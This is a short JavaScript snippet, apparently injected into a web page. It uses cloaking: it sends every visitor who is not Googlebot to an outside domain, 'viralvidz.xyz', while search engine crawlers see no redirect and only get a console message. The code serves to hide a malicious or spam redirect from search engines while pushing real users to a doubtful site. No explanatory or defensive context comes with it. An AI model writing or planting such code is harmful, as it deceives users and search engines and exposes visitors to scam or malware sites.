if (!navigator.userAgent.includes('Googlebot')) {
  // Regular users - will be redirected
  window.location.href = "https://viralvidz.xyz/viral-video/?hol";
} else {
  // Search engine bots - no redirect
  console.log("Thanks for visiting my page");
}
